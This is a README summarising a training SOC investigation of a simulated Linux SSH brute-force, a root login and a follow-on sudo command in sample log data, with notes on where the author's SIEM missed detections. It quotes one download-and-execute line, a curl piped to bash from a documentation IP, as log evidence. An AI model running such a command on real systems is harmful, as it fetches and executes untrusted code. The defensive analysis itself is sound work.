# SOC Investigation 001: Linux SSH brute force, root login and download-and-execute

A training case study. I investigated a High-severity SSH brute-force alert in **Mini SIEM**, my self-built SIEM project, using a sample Linux `auth.log` from the [Splunk-Logs-ACEP-SOC-Lab](https://github.com/chaitanyaeshwarprasad/Splunk-Logs-ACEP-SOC-Lab) training dataset by Anisetti Chaitanya Eshwar Prasad, then went back to the raw log to see what the SIEM had missed.

> **This is not a real incident.** The source IP (203.0.113.50) is a reserved documentation address (TEST-NET-3), the timing is perfectly regular, and the log is sample data.

## What's in this folder

| Item | What it is |
|---|---|
| `SOC_Investigation_001_Linux_SSH_Brute_Force.pdf` | The 6-page investigation report |
| `evidence/` | The cropped screenshots used in the report |
| `sample-data/README.md` | What is and isn't known about the sample log, including its SHA-256 hash |

## Summary

- Mini SIEM raised a **High** brute-force alert (MITRE ATT&CK **T1110**) against `root` on `LNX-WEB-001`.
- The raw log shows three stages from one IP: **300 failed root logins** exactly 3 seconds apart, a **successful root password login** 20 minutes 17 seconds later, and **46 seconds after that** a sudo command, `curl http://203.0.113.50/payload.sh | bash`, which downloads and runs a script from the same address.
- In a real environment this would be handled as a host compromise. The log does not show what the script did.
- Mini SIEM detected only the first stage. I traced both gaps to the code:
  - the login fell outside the 10-minute window of the `brute_force_then_success` rule;
  - `sudo` lines are stored as plain syslog text with no user or command fields, no rule inspects them, and the Events text search cannot find the script name (searching `payload.sh` returns nothing, while `curl` finds the stored event).
- The alert's "100 failed logins" and the 50 event references are explained too: a 5-minute window count and a 50-item evidence cap.
- The other 2,000 SSH events are routine internal key-based logins. No other failures and no other root login.

## What I did

1. Reviewed the alert and the events behind it, and built a timeline.
2. Reconciled the counts against the Mini SIEM source code.
3. Analysed the whole raw log and found the sudo command that the SIEM did not alert on.
4. Mapped the activity to MITRE ATT&CK (T1110, T1078, T1105, T1059.004) and wrote prioritised response actions.
5. Wrote detection-engineering recommendations: a sudo parser, a download-and-execute rule, a post-login command rule, and a longer login-after-brute-force window.

## Limits (also in the report)

- The payload and the command's result are not in the log.
- The dataset repository states no licence, so the log file is not redistributed here.
- Rule behaviour was checked in the repository code; the deployed code is reported unchanged and the rule enabled.
- Windows and web-server sample logs were also tried but are out of scope here.

Prepared by Ammar Badlawala. Part of my [security analyst reports](../README.md).
